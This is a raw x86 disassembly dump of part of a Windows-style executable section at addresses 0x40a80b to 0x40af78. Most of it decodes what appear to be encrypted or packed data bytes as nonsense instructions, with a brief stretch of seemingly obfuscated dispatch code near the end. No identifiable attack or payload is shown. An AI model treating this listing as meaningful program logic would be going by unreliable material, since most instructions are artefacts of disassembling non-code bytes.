  40a80b:	out    0x18,al
  40a80d:	arpl   WORD PTR [edi+0x6b7c5e2e],bp
  40a813:	xor    al,0xb0
  40a815:	push   ebp
  40a816:	jp     0x40a80c
  40a818:	adc    al,0x84
  40a81a:	jecxz  0x40a84e
  40a81c:	or     DWORD PTR [edx-0x3ba1f14c],ecx
  40a822:	add    bh,BYTE PTR [ecx-0x5941be77]
  40a828:	push   ss
  40a829:	mov    dl,0x6b
  40a82b:	outs   dx,BYTE PTR ds:[esi]
  40a82c:	fwait
  40a82d:	sub    DWORD PTR [edi+eiz*2],esi
  40a830:	hlt    
  40a831:	xor    BYTE PTR [eax],bh
  40a833:	cmp    dl,dh
  40a835:	mov    DWORD PTR [edi+0x61],esi
  40a838:	arpl   WORD PTR [eax+0x53],ax
  40a83b:	mov    esp,0x4ec90373
  40a840:	xor    BYTE PTR [eax-0x72],bl
  40a843:	cmp    DWORD PTR [eax+0x68],0xb5c3fbbb
  40a84a:	pop    edi
  40a84b:	inc    ebx
  40a84c:	inc    edx
  40a84d:	dec    ebx
  40a84e:	pop    edx
  40a84f:	addr16 (bad) 
  40a851:	pushf  
  40a852:	jb     0x40a825
  40a854:	or     edi,ecx
  40a856:	pop    ebp
  40a857:	sbb    eax,0x5433111d
  40a85c:	popf   
  40a85d:	idiv   ebp
  40a85f:	shl    bl,cl
  40a861:	scas   al,BYTE PTR es:[edi]
  40a862:	dec    ebx
  40a863:	int    0xed
  40a865:	jo     0x40a856
  40a867:	test   bl,cl
  40a869:	out    dx,al
  40a86a:	or     BYTE PTR [ebp-0x3f34f2d6],cl
  40a870:	enter  0xc993,0xe5
  40a874:	sub    DWORD PTR [edi+0x320f7314],eax
  40a87a:	and    DWORD PTR [edi+0x55],edi
  40a87d:	je     0x40a851
  40a87f:	cdq    
  40a880:	mul    DWORD PTR [ebx+0x52]
  40a883:	imul   ebp,DWORD PTR [ebx],0x19d673c6
  40a889:	jbe    0x40a8c9
  40a88b:	sub    eax,0x4cc5b795
  40a890:	push   cs
  40a891:	cmp    al,0x99
  40a893:	push   ebx
  40a894:	pop    eax
  40a895:	retf   
  40a896:	push   cs
  40a897:	dec    ecx
  40a898:	aas    
  40a899:	ret    
  40a89a:	in     al,0xc8
  40a89c:	xor    al,0xdc
  40a89e:	and    al,0xec
  40a8a0:	jecxz  0x40a839
  40a8a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8a3:	jno    0x40a85d
  40a8a5:	mov    BYTE PTR [eax],al
  40a8a7:	dec    edi
  40a8a8:	nop
  40a8a9:	add    dh,BYTE PTR [esi+edx*8]
  40a8ac:	cs cmp eax,0xfadb585a
  40a8b2:	add    dl,BYTE PTR [eax]
  40a8b4:	leave  
  40a8b5:	pop    ss
  40a8b6:	test   bl,0x4a
  40a8b9:	outs   dx,DWORD PTR ds:[esi]
  40a8ba:	(bad)  
  40a8bc:	popf   
  40a8bd:	je     0x40a8ad
  40a8bf:	jnp    0x40a845
  40a8c1:	(bad)  
  40a8c2:	sti    
  40a8c3:	daa    
  40a8c4:	js     0x40a8b7
  40a8c6:	cmc    
  40a8c7:	adc    eax,DWORD PTR [esi*8-0x1a2272e7]
  40a8ce:	lods   al,BYTE PTR ds:[esi]
  40a8cf:	pop    eax
  40a8d0:	clc    
  40a8d1:	jmp    0xec5b:0x8ee90750
  40a8d8:	cmp    BYTE PTR [esi],cl
  40a8da:	mov    eax,ds:0x2aae9051
  40a8df:	xchg   ecx,eax
  40a8e0:	ins    DWORD PTR es:[edi],dx
  40a8e1:	lea    esp,[edi-0xf717dbe]
  40a8e7:	cmc    
  40a8e8:	cdq    
  40a8e9:	mov    ch,0x6f
  40a8eb:	push   0x5ca7f9cf
  40a8f0:	in     al,dx
  40a8f1:	and    eax,0x3731f0d5
  40a8f6:	addr16 dec ebp
  40a8f8:	das    
  40a8f9:	leave  
  40a8fa:	mov    bl,0xc8
  40a8fc:	loope  0x40a888
  40a8fe:	lea    ebx,[ecx+0x7d]
  40a901:	mov    bl,0xfd
  40a903:	lds    edi,FWORD PTR [edx-0x68a0b48]
  40a909:	mov    cl,0xaf
  40a90b:	jns    0x40a8e4
  40a90d:	gs xor esp,ebx
  40a910:	pop    es
  40a911:	xchg   ebx,eax
  40a912:	pushf  
  40a913:	sub    bl,BYTE PTR [ebx+0xa]
  40a916:	xchg   ebx,eax
  40a917:	ins    BYTE PTR es:[edi],dx
  40a918:	aas    
  40a919:	call   0x668ff8a1
  40a91e:	cmp    edi,esp
  40a920:	ins    DWORD PTR es:[edi],dx
  40a921:	push   ebx
  40a922:	inc    esp
  40a923:	aad    0x24
  40a925:	jecxz  0x40a91d
  40a927:	add    al,0x44
  40a929:	jno    0x40a987
  40a92b:	pusha  
  40a92c:	popa   
  40a92d:	enter  0xe797,0x90
  40a931:	ss push edi
  40a933:	es enter 0x482b,0xc9
  40a938:	cld    
  40a939:	pusha  
  40a93a:	mov    es,WORD PTR [ebx+0x1d67c037]
  40a940:	inc    edx
  40a941:	call   0x4bb2:0xc2b5d465
  40a948:	add    esi,esi
  40a94a:	not    DWORD PTR [ebx]
  40a94c:	add    esp,edx
  40a94e:	push   ss
  40a94f:	and    esi,esi
  40a951:	test   eax,0x391fae26
  40a956:	pop    edi
  40a957:	push   0x598eba1c
  40a95c:	pop    ecx
  40a95d:	fistp  WORD PTR [edx+0x18c6ae8e]
  40a963:	out    0x92,al
  40a965:	fucomi st,st(7)
  40a967:	sub    al,0xe2
  40a969:	out    dx,al
  40a96a:	dec    edx
  40a96b:	mov    ds:0x1e7ea182,eax
  40a970:	rcl    DWORD PTR [ebp+0x32],1
  40a973:	outs   dx,BYTE PTR ds:[esi]
  40a974:	adc    DWORD PTR [edx],ebx
  40a976:	data16 test BYTE PTR [ebp-0x51],ch
  40a97a:	add    al,0xfc
  40a97c:	xor    al,0x4
  40a97e:	jns    0x40a9ea
  40a980:	inc    ebp
  40a981:	repnz ds clc 
  40a984:	pop    edx
  40a985:	ins    DWORD PTR es:[edi],dx
  40a986:	fs cld 
  40a988:	sub    esp,DWORD PTR [ecx]
  40a98a:	sbb    BYTE PTR [ebp-0x46],0x18
  40a98e:	adc    ch,al
  40a990:	aam    0xe2
  40a992:	xor    BYTE PTR [edx-0x1417d12d],al
  40a998:	jmp    0x5c27:0xadbabcc3
  40a99f:	sbb    eax,0x41d9e6e8
  40a9a4:	sbb    eax,0x8b13ea5
  40a9a9:	sbb    eax,0xdcc1140d
  40a9ae:	xor    al,0x8
  40a9b0:	fwait
  40a9b1:	daa    
  40a9b2:	sub    edi,ecx
  40a9b4:	adc    al,0xc
  40a9b6:	xchg   ecx,eax
  40a9b7:	adc    BYTE PTR [ebp+0x35164f3],0x9b
  40a9be:	loopne 0x40a999
  40a9c0:	sub    al,0xdb
  40a9c2:	mov    esp,0x2ffae4a5
  40a9c7:	cs jne 0x40aa43
  40a9ca:	fldl2e 
  40a9cc:	or     BYTE PTR [ecx-0x4775a3ab],0x8
  40a9d3:	or     edx,ecx
  40a9d5:	dec    edx
  40a9d6:	pushf  
  40a9d7:	ret    
  40a9d8:	pop    es
  40a9d9:	dec    ecx
  40a9da:	inc    esi
  40a9db:	or     al,0xfa
  40a9dd:	sub    ebp,ecx
  40a9df:	addr16 push ebp
  40a9e1:	add    ebx,DWORD PTR [ecx-0x54]
  40a9e4:	fld    QWORD PTR [ecx+0xe3b8fd]
  40a9ea:	and    BYTE PTR [ebp-0x7524f250],ch
  40a9f0:	mov    eax,esp
  40a9f2:	cli    
  40a9f3:	push   ecx
  40a9f4:	ins    BYTE PTR es:[edi],dx
  40a9f5:	push   es
  40a9f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9f7:	inc    edx
  40a9f8:	idiv   BYTE PTR [esi+0x34]
  40a9fb:	mov    ebp,0x8f870125
  40aa00:	xor    eax,0x3698c8d
  40aa05:	xor    al,0x2e
  40aa07:	or     ah,dl
  40aa09:	jmp    0x40a993
  40aa0b:	jns    0x40aa70
  40aa0d:	sbb    eax,0xe6771085
  40aa12:	push   0x5a
  40aa14:	jne    0x40a9e7
  40aa16:	jmp    0x5f4:0xda733db
  40aa1d:	call   0x48f3a972
  40aa22:	xchg   esi,eax
  40aa23:	les    ecx,FWORD PTR [esi-0x3d]
  40aa26:	fdivr  QWORD PTR [edi+eax*4-0x74]
  40aa2a:	jbe    0x40aa40
  40aa2c:	js     0x40a9bf
  40aa2e:	neg    BYTE PTR [eax+esi*4+0x5ee61d2]
  40aa35:	ins    DWORD PTR es:[edi],dx
  40aa36:	add    eax,0xdbeb3728
  40aa3b:	inc    ebx
  40aa3c:	mov    al,ds:0xfe931ba7
  40aa41:	push   0xffffff81
  40aa43:	pushf  
  40aa44:	shl    DWORD PTR [ebx+0x56],cl
  40aa47:	sar    DWORD PTR [edx+edi*8+0x71],cl
  40aa4b:	sbb    BYTE PTR [edx-0xf],dh
  40aa4e:	jle    0x40aa6f
  40aa50:	fdiv   QWORD PTR [ecx]
  40aa52:	scas   al,BYTE PTR es:[edi]
  40aa53:	and    dh,ch
  40aa55:	sub    ebp,DWORD PTR ds:0x4e6ca8c9
  40aa5b:	(bad)  
  40aa5d:	mov    ds:0xd260e338,eax
  40aa62:	and    esp,DWORD PTR [edx+0x28]
  40aa65:	leave  
  40aa66:	(bad)  
  40aa67:	es jmp 0x97568a3a
  40aa6d:	idiv   DWORD PTR [di-0x6]
  40aa71:	aad    0x9c
  40aa73:	fst    DWORD PTR [edi+0x6d]
  40aa76:	cdq    
  40aa77:	inc    edx
  40aa78:	pop    esp
  40aa79:	inc    edx
  40aa7a:	adc    al,0x59
  40aa7c:	mov    dl,0x5b
  40aa7e:	fsubr  DWORD PTR [edi+0x22]
  40aa81:	cmp    DWORD PTR [ebx+edi*8],eax
  40aa84:	cmp    bl,dh
  40aa86:	sahf   
  40aa87:	adc    DWORD PTR [ebx],ebx
  40aa89:	(bad)  
  40aa8a:	xchg   edi,eax
  40aa8b:	not    BYTE PTR [eax]
  40aa8d:	int    0x3b
  40aa8f:	call   0x30b4:0xa2e6dcf4
  40aa96:	pop    esi
  40aa97:	or     eax,0x6dfede40
  40aa9c:	mov    edi,0x75473740
  40aaa1:	sbb    edi,DWORD PTR [ecx-0x22]
  40aaa4:	dec    esi
  40aaa5:	and    al,0x21
  40aaa7:	in     al,dx
  40aaa8:	leave  
  40aaa9:	pop    eax
  40aaaa:	dec    esp
  40aaab:	aaa    
  40aaac:	pushf  
  40aaad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaae:	ss push 0x5d58aadc
  40aab4:	or     BYTE PTR [ecx],cl
  40aab6:	mov    ds:0x617f7abc,eax
  40aabb:	cld    
  40aabc:	pop    eax
  40aabd:	stos   DWORD PTR es:[edi],eax
  40aabe:	clc    
  40aabf:	mov    ds:0x39049f47,eax
  40aac4:	scas   eax,DWORD PTR es:[edi]
  40aac5:	and    BYTE PTR [ebp+ebx*8+0x3931b685],ch
  40aacc:	mov    ebx,esi
  40aace:	jns    0x40aabb
  40aad0:	xchg   dl,al
  40aad2:	js     0x40aac0
  40aad4:	pop    ecx
  40aad5:	neg    edx
  40aad7:	lahf   
  40aad8:	in     al,dx
  40aad9:	or     ch,ah
  40aadb:	xlat   BYTE PTR ds:[ebx]
  40aadc:	ss mov ecx,0xf5a54f2e
  40aae2:	inc    esi
  40aae3:	or     al,0x9c
  40aae5:	jle    0x40aabb
  40aae7:	out    0x2,eax
  40aae9:	jge    0x40aa71
  40aaeb:	dec    ebx
  40aaec:	test   BYTE PTR [edx],bh
  40aaee:	push   edi
  40aaef:	jnp    0x40aaa4
  40aaf1:	mov    ah,0x30
  40aaf3:	test   BYTE PTR [eax+0x3962d963],al
  40aaf9:	mov    fs,WORD PTR [edi+0x20d29e70]
  40aaff:	mov    ebx,0x407eaddc
  40ab04:	fild   WORD PTR [eax+0x62]
  40ab07:	leave  
  40ab08:	ss pop esp
  40ab0a:	xor    DWORD PTR [eax-0x6f],ebp
  40ab0d:	xchg   esp,eax
  40ab0e:	aam    0x3b
  40ab10:	mov    eax,ds:0xb7ee83fc
  40ab15:	sbb    eax,0xa568fc1d
  40ab1a:	xchg   BYTE PTR [edx+edx*4],al
  40ab1d:	ret    
  40ab1e:	adc    al,0xda
  40ab20:	imul   ebx,DWORD PTR [edi-0x7b],0x57fe80ce
  40ab27:	push   0xffffffd9
  40ab29:	scas   eax,DWORD PTR es:[edi]
  40ab2a:	sbb    eax,0x571f8cdb
  40ab2f:	hlt    
  40ab30:	(bad)  
  40ab31:	int    0xf2
  40ab33:	jno    0x40aac0
  40ab35:	jbe    0x40aae7
  40ab37:	pop    edx
  40ab38:	push   eax
  40ab39:	hlt    
  40ab3a:	pop    edi
  40ab3b:	jp     0x40aaca
  40ab3d:	iret   
  40ab3e:	icebp  
  40ab3f:	xlat   BYTE PTR ds:[ebx]
  40ab40:	cmp    BYTE PTR [ecx],ch
  40ab42:	cdq    
  40ab43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab44:	scas   eax,DWORD PTR es:[edi]
  40ab45:	inc    ebp
  40ab46:	jmp    DWORD PTR [esi-0x12]
  40ab49:	sbb    ebp,DWORD PTR [ebp+0x52df1d8c]
  40ab4f:	xchg   ebx,eax
  40ab50:	pop    eax
  40ab51:	or     eax,0xaa173583
  40ab56:	push   ecx
  40ab57:	adc    dh,BYTE PTR [edx-0x52]
  40ab5a:	cld    
  40ab5b:	(bad)  ds:0xb38dd2e5
  40ab61:	xchg   ecx,eax
  40ab62:	sbb    dl,cl
  40ab64:	mov    ds:0xb5b63e30,eax
  40ab69:	pusha  
  40ab6a:	inc    esi
  40ab6b:	loopne 0x40ab95
  40ab6d:	rcr    DWORD PTR [edi-0x54],1
  40ab70:	ds ja  0x40ab98
  40ab73:	inc    edi
  40ab74:	adc    DWORD PTR [eax+0x8],esp
  40ab77:	ss xchg edx,eax
  40ab79:	mov    ch,0xeb
  40ab7b:	es push esp
  40ab7d:	and    dh,BYTE PTR [ebx]
  40ab7f:	out    0x87,eax
  40ab81:	inc    ecx
  40ab82:	mov    al,0x5f
  40ab84:	in     eax,0x19
  40ab86:	shr    BYTE PTR gs:[ecx+0x16ea13b6],cl
  40ab8d:	stc    
  40ab8e:	mov    DWORD PTR [eax+0xcc1bb85],ebx
  40ab94:	loop   0x40abee
  40ab96:	mov    ah,0x1c
  40ab98:	ins    BYTE PTR es:[edi],dx
  40ab99:	cmc    
  40ab9a:	jbe    0x40ac1b
  40ab9c:	(bad)  [eax]
  40ab9e:	adc    al,0x4c
  40aba0:	idiv   BYTE PTR [ebx+0x3d]
  40aba3:	outs   dx,BYTE PTR ds:[esi]
  40aba4:	in     eax,dx
  40aba5:	enter  0x287a,0x78
  40aba9:	sub    al,0x66
  40abab:	sbb    BYTE PTR [eax],al
  40abad:	cmp    al,0xfd
  40abaf:	sub    eax,0x448bf9b2
  40abb4:	out    dx,eax
  40abb5:	add    ecx,edx
  40abb7:	xor    al,0xbe
  40abb9:	xor    al,0xb1
  40abbb:	aaa    
  40abbc:	mov    bh,0xd
  40abbe:	dec    edi
  40abbf:	data16 mov al,0xba
  40abc2:	cmp    al,ch
  40abc4:	pop    edx
  40abc5:	pop    esi
  40abc6:	dec    esp
  40abc7:	sti    
  40abc8:	std    
  40abc9:	inc    esp
  40abca:	mov    DWORD PTR [ebp+0x3],esp
  40abcd:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40abcf:	je     0x40ac20
  40abd1:	ret    0x851e
  40abd4:	mov    WORD PTR [edi],fs
  40abd6:	(bad)  
  40abd8:	cld    
  40abd9:	lods   al,BYTE PTR ds:[esi]
  40abda:	xchg   DWORD PTR ds:0xb2630e96,edi
  40abe0:	xor    BYTE PTR ds:[eax+0x62],bh
  40abe4:	je     0x40abdd
  40abe6:	sbb    bl,bh
  40abe8:	scas   al,BYTE PTR es:[edi]
  40abe9:	push   ebp
  40abea:	idiv   DWORD PTR [edx+edi*2]
  40abed:	and    DWORD PTR [eax+0x461f44c3],0x1b
  40abf4:	(bad)  
  40abf5:	bound  edi,QWORD PTR [ecx]
  40abf7:	arpl   WORD PTR [eax],bp
  40abf9:	dec    ebp
  40abfa:	stos   DWORD PTR es:[edi],eax
  40abfb:	cld    
  40abfc:	fcmovb st,st(1)
  40abfe:	cmp    ebp,0x529560dd
  40ac04:	fwait
  40ac05:	js     0x40abfa
  40ac07:	or     bl,BYTE PTR ds:0xd9fe8a86
  40ac0d:	adc    edi,esi
  40ac0f:	xor    al,0x20
  40ac11:	xor    eax,0xaacdd0c3
  40ac16:	ja     0x40abd2
  40ac18:	push   es
  40ac19:	sub    BYTE PTR [edi+0x71],dl
  40ac1c:	inc    edi
  40ac1d:	retf   
  40ac1e:	cmp    eax,0x738c2a2c
  40ac23:	and    esi,DWORD PTR [ebx-0x32]
  40ac26:	nop
  40ac27:	pop    ebp
  40ac28:	popa   
  40ac29:	into   
  40ac2a:	not    DWORD PTR [edi+0x597a64ae]
  40ac30:	sbb    esi,ebp
  40ac32:	fdiv   DWORD PTR [edi-0x5d]
  40ac35:	mov    ebp,0xccaa2461
  40ac3a:	test   DWORD PTR [ebx],eax
  40ac3c:	adc    BYTE PTR [ecx-0x1fe80b63],ah
  40ac42:	cmp    DWORD PTR [edi+0x2d],edi
  40ac45:	pop    ecx
  40ac46:	stos   DWORD PTR es:[edi],eax
  40ac47:	fadd   DWORD PTR [eax+0x4]
  40ac4a:	iret   
  40ac4b:	or     DWORD PTR [ecx-0x1d2cc85e],0x54b2019e
  40ac55:	stos   DWORD PTR es:[edi],eax
  40ac56:	inc    edi
  40ac57:	enter  0xac18,0xf6
  40ac5b:	aad    0x56
  40ac5d:	dec    edx
  40ac5e:	stc    
  40ac5f:	jmp    0x4c04:0xd2de9cea
  40ac66:	pop    ds
  40ac67:	cwde   
  40ac68:	push   ds
  40ac69:	inc    esi
  40ac6a:	out    dx,al
  40ac6b:	shl    BYTE PTR [edx-0x71],1
  40ac6e:	pop    ecx
  40ac6f:	enter  0x1d7f,0xaf
  40ac73:	shl    DWORD PTR [ecx],0x58
  40ac76:	sbb    eax,0x21f9742b
  40ac7b:	and    eax,0x94c7e002
  40ac80:	sbb    eax,0x4ed0ae4e
  40ac85:	rcl    esp,cl
  40ac87:	mov    dh,0x4f
  40ac89:	mov    BYTE PTR [edi],dl
  40ac8b:	mov    al,ds:0x428bb2f5
  40ac90:	ds add ch,bh
  40ac93:	test   BYTE PTR [ebx-0x33],ah
  40ac96:	mov    cl,0x4d
  40ac98:	mov    eax,ds:0xc50204bc
  40ac9d:	popf   
  40ac9e:	scas   al,BYTE PTR es:[edi]
  40ac9f:	push   edx
  40aca0:	mov    bl,0x3d
  40aca2:	xchg   BYTE PTR ds:0x7d5d6b03,ch
  40aca8:	sbb    BYTE PTR [edi-0x5d5e84ac],dh
  40acae:	clc    
  40acaf:	retf   0x915a
  40acb2:	nop
  40acb3:	or     eax,0x7243b249
  40acb8:	pop    es
  40acb9:	aam    0x4c
  40acbb:	adc    dl,BYTE PTR [esi]
  40acbd:	sbb    eax,0x47f2085a
  40acc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acc3:	cmp    esi,DWORD PTR [ebx+0x33]
  40acc6:	ret    0xe3c6
  40acc9:	adc    ch,dh
  40accb:	hlt    
  40accc:	jae    0x40ac57
  40acce:	pop    ebp
  40accf:	ret    
  40acd0:	xor    BYTE PTR [edi+0x6a901161],al
  40acd6:	clc    
  40acd7:	jl     0x40acf8
  40acd9:	mov    ebx,0xdae7afc9
  40acde:	adc    esi,edx
  40ace0:	xor    cl,0x34
  40ace3:	sub    al,0xc5
  40ace5:	ja     0x40ad66
  40ace7:	mov    dh,0xf
  40ace9:	shl    DWORD PTR [edi+edx*2-0x7e],cl
  40aced:	jmp    0x2330:0x6d9af35a
  40acf4:	dec    ecx
  40acf5:	dec    edi
  40acf6:	dec    esi
  40acf7:	lds    edx,FWORD PTR [esi+0x4]
  40acfa:	xchg   edi,eax
  40acfb:	xor    eax,0xa5f76321
  40ad00:	mov    ebx,0xe89db435
  40ad05:	xchg   esp,eax
  40ad06:	sbb    al,0x33
  40ad08:	push   ebp
  40ad09:	pop    edi
  40ad0a:	sub    bl,0x3b
  40ad0d:	push   esp
  40ad0e:	cld    
  40ad0f:	and    dh,bl
  40ad11:	sub    BYTE PTR [edx],cl
  40ad13:	push   esi
  40ad14:	jmp    0x8dbfefb4
  40ad19:	shl    ebp,1
  40ad1b:	retf   0x88c9
  40ad1e:	js     0x40acc8
  40ad20:	add    bl,BYTE PTR [ebp-0x47]
  40ad23:	mov    ebp,DWORD PTR [eax]
  40ad25:	push   edx
  40ad26:	push   edi
  40ad27:	bound  edi,QWORD PTR ds:0xd0eedc46
  40ad2d:	cmp    edi,ebx
  40ad2f:	inc    edx
  40ad30:	adc    al,0xef
  40ad32:	jmp    0x40ad25
  40ad34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad35:	fist   WORD PTR cs:[esi]
  40ad38:	jg     0x40ad00
  40ad3a:	call   0xbb66f495
  40ad3f:	sbb    eax,0x4db30519
  40ad44:	xchg   ebp,eax
  40ad45:	xlat   BYTE PTR ds:[ebx]
  40ad46:	and    eax,0x314c34d9
  40ad4b:	xchg   edi,eax
  40ad4c:	aad    0x6c
  40ad4e:	rcr    BYTE PTR [ecx-0x51a87106],0xe1
  40ad55:	cmc    
  40ad56:	xchg   ecx,eax
  40ad57:	push   0x56
  40ad59:	retf   0xd1e9
  40ad5c:	out    0xdb,eax
  40ad5e:	dec    esi
  40ad5f:	sbb    DWORD PTR [edi-0x38a281f1],eax
  40ad65:	sbb    al,0x7e
  40ad67:	push   0x95e86a0a
  40ad6c:	mov    ds,WORD PTR [ebx-0x69cbb465]
  40ad72:	adc    eax,0x7ef3b8d9
  40ad77:	scas   al,BYTE PTR es:[edi]
  40ad78:	mov    eax,cs:0x153399fd
  40ad7e:	push   0x52
  40ad80:	xchg   ebx,eax
  40ad81:	mov    dh,0x6c
  40ad83:	repnz pushf 
  40ad85:	jno    0x40ad31
  40ad87:	and    BYTE PTR [edx-0x7a959ee2],al
  40ad8d:	rol    BYTE PTR [edx-0x4c765be1],0xd2
  40ad94:	test   eax,0x3aaea5de
  40ad99:	pop    es
  40ad9a:	mov    dh,0x39
  40ad9c:	rcl    DWORD PTR [eax-0x1a677b93],1
  40ada2:	mov    esi,0x240d176d
  40ada7:	adc    al,0x7a
  40ada9:	dec    eax
  40adaa:	cmc    
  40adab:	fnstsw WORD PTR [ebx]
  40adad:	push   ecx
  40adae:	ss out dx,eax
  40adb0:	push   eax
  40adb1:	fwait
  40adb2:	or     eax,0x1848d595
  40adb7:	adc    ebx,DWORD PTR [ecx]
  40adb9:	pop    ebp
  40adba:	inc    esi
  40adbb:	add    bh,BYTE PTR [edi+0x2301e8a7]
  40adc1:	pop    ebp
  40adc2:	push   0x1f
  40adc4:	in     eax,dx
  40adc5:	xchg   BYTE PTR [ebp+0x47],bh
  40adc8:	in     eax,dx
  40adc9:	mov    ecx,0xa8df3e8
  40adce:	and    al,0xdc
  40add0:	lea    ebp,[ebp+0x1a]
  40add3:	ret    0xc04c
  40add6:	(bad)  
  40add7:	cmp    al,0x48
  40add9:	push   ds
  40adda:	imul   eax,DWORD PTR [ecx+0x34],0xe8e92ace
  40ade1:	rcr    DWORD PTR [ebx*4-0x4bbb7644],cl
  40ade8:	adc    eax,0x8a998280
  40aded:	push   ecx
  40adee:	push   edi
  40adef:	test   al,0x9
  40adf1:	int3   
  40adf2:	pop    ebp
  40adf3:	pushf  
  40adf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adf5:	mov    eax,0x6da32128
  40adfa:	pusha  
  40adfb:	jae    0x40ae0e
  40adfd:	pop    edx
  40adfe:	jmp    0xd72:0xe29f874d
  40ae05:	mov    al,ds:0xde4bf834
  40ae0a:	mov    esp,0x32e4aee1
  40ae0f:	xor    dh,BYTE PTR [edx+0x222f6952]
  40ae15:	push   ebx
  40ae16:	pop    ds
  40ae17:	xchg   edi,eax
  40ae18:	fsubr  DWORD PTR [ebp-0x21]
  40ae1b:	ds or  al,0x7c
  40ae1e:	xchg   edi,eax
  40ae1f:	sbb    eax,0x72ab69b2
  40ae24:	mov    esi,0xfabc5d07
  40ae29:	(bad)  
  40ae2a:	jl     0x40ae5f
  40ae2c:	test   esi,0x70d483b9
  40ae32:	lahf   
  40ae33:	jmp    0x56d6:0xaf37afbf
  40ae3a:	dec    esp
  40ae3b:	shl    dl,0x68
  40ae3e:	fidiv  DWORD PTR [ebp+eax*8+0x4d]
  40ae42:	jg     0x40add5
  40ae44:	test   al,0x3c
  40ae46:	jl     0x40ae59
  40ae48:	mov    dl,0xed
  40ae4a:	mov    eax,0xe00eaaf6
  40ae4f:	sbb    bh,dl
  40ae51:	and    esp,eax
  40ae53:	sub    dh,BYTE PTR [edi]
  40ae55:	aas    
  40ae56:	lock jne 0x40ade8
  40ae59:	mov    edx,DWORD PTR [ebp+0x8]
  40ae5c:	imul   esi,ebx,0xffffffbc
  40ae5f:	cli    
  40ae60:	pop    esp
  40ae61:	pop    ds
  40ae62:	dec    eax
  40ae63:	out    dx,al
  40ae64:	push   esp
  40ae65:	rcl    DWORD PTR [ebx-0x8f5e569],cl
  40ae6b:	fwait
  40ae6c:	ja     0x40aec6
  40ae6e:	ss inc eax
  40ae70:	mov    ebp,DWORD PTR [ebp+0x5f]
  40ae73:	mov    dh,0xda
  40ae75:	pop    edx
  40ae76:	sbb    BYTE PTR [esi-0x73],0x2b
  40ae7a:	dec    edi
  40ae7b:	scas   eax,DWORD PTR es:[edi]
  40ae7c:	retf   0xb932
  40ae7f:	mov    WORD PTR [ebx+0x27],cs
  40ae82:	test   DWORD PTR [edi],0x61edac48
  40ae88:	lods   al,BYTE PTR ds:[esi]
  40ae89:	retf   
  40ae8a:	sbb    eax,0xeba21aba
  40ae8f:	(bad)  
  40ae90:	jmp    0x40aed8
  40ae92:	pop    edx
  40ae93:	(bad)  
  40ae95:	jb     0x40ae9c
  40ae97:	xchg   ebx,eax
  40ae98:	fidivr WORD PTR [edi-0x175dabbd]
  40ae9e:	ror    ecx,0xdd
  40aea1:	sbb    ah,BYTE PTR [eax]
  40aea3:	and    BYTE PTR [edi],ch
  40aea5:	cmp    BYTE PTR [edx],ah
  40aea7:	mov    al,0xb8
  40aea9:	in     al,0xca
  40aeab:	movzx  eax,WORD PTR [eax+ebx*2]
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx-0x2f5d58d0],al
  40aef6:	out    dx,eax
  40aef7:	dec    ebp
  40aef8:	or     BYTE PTR [ecx],0x7b
  40aefb:	jnp    0x40af10
  40aefd:	pushf  
  40aefe:	jnp    0x40af7b
  40af00:	(bad)  
  40af01:	stc    
  40af02:	lods   eax,DWORD PTR ds:[esi]
  40af03:	mov    ebx,0x741ba73a
  40af08:	mov    esi,0x2e46a15f
  40af0d:	push   esp
  40af0e:	test   BYTE PTR [edx+edi*2-0xf],ah
  40af12:	dec    ecx
  40af13:	fisttp QWORD PTR [edi+0x53]
  40af16:	ret    
  40af17:	adc    eax,0x60c8d2b6
  40af1c:	(bad)  
  40af1d:	enter  0x58c1,0x90
  40af21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af22:	aas    
  40af23:	inc    edi
  40af24:	cli    
  40af25:	shl    BYTE PTR [ebx-0x6e],0xf6
  40af29:	mov    WORD PTR [ebx],gs
  40af2b:	sub    ebp,esi
  40af2d:	push   edx
  40af2e:	mov    ebx,0xf48ee81
  40af33:	dec    esi
  40af34:	push   esp
  40af35:	imul   edx,DWORD PTR [ecx],0x7b
  40af38:	xchg   DWORD PTR [esi],edi
  40af3a:	mov    esp,0xe59f6eda
  40af3f:	add    ebp,DWORD PTR [eax-0x58]
  40af42:	adc    dl,BYTE PTR [esp+eax*2+0x1d936c5f]
  40af49:	iret   
  40af4a:	std    
  40af4b:	mul    dl
  40af4d:	jp     0x40af1a
  40af4f:	cmp    BYTE PTR [ebx],bl
  40af51:	mov    bh,0x54
  40af53:	lock fidivr DWORD PTR [edi]
  40af56:	adc    cl,BYTE PTR [ebx-0x11]
  40af59:	scas   eax,DWORD PTR es:[edi]
  40af5a:	xchg   ecx,eax
  40af5b:	xchg   ecx,eax
  40af5c:	sub    bh,BYTE PTR [ebx+0x55786af1]
  40af62:	shl    DWORD PTR [edi+eiz*2+0x72507a13],cl
  40af69:	push   ds
  40af6a:	jmp    0x26bc8ad6
  40af6f:	cmp    eax,0x13d0fb22
  40af74:	fbstp  TBYTE PTR [ebx+esi*8+0x56]
  40af78:	push   ebx
